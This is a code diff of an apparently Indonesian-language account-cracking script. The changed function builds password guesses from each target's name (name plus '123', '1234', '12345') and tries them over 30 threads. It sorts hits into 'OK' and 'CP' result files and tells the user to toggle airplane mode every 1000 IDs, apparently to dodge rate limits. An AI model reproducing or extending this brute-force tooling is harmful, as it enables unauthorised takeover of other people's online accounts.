@@ -914,10 +914,10 @@ def setting():
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]--------------------#
 def passwrd():
-	print('\x1b[1;92m<-------------------------------------------------------------------->')
+	print('\x1b[1;92m<------------------------------------------------------------------------------------------->')
 	print(f' \x1b[1;96mHasil {h}OK{x} \x1b[1;96mTersimpan Di : {h}OK/%s {x}'%(okc))
 	print(f' \x1b[1;96mHasil {k}CP{x} \x1b[1;96mTersimpan Di : {k}CP/%s {x}'%(cpc))
-	cetak(nel(f'\t\t       {O}Mainkan Mode Pesawat Setiap {K2}1000 ID {O}Selama 10 Detik !'))
+	cetak(nel(f'\t     {O}Mainkan Mode Pesawat Setiap {K2}1000 ID {O}Selama 10 Detik !'))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -927,17 +927,14 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-				    pwv.append(frs+'123')
+					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
-			   else:
-				   if len(frs)<3:
-					  pwv.append(nmf)
-			   else:
+			else:
+				if len(frs)<3:
 					pwv.append(nmf)
-					pwv.append(frs+'1')
-					pwv.append(frs+'12')
-					pwv.append(frs+'321')
+				else:
+					pwv.append(nmf)
 					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
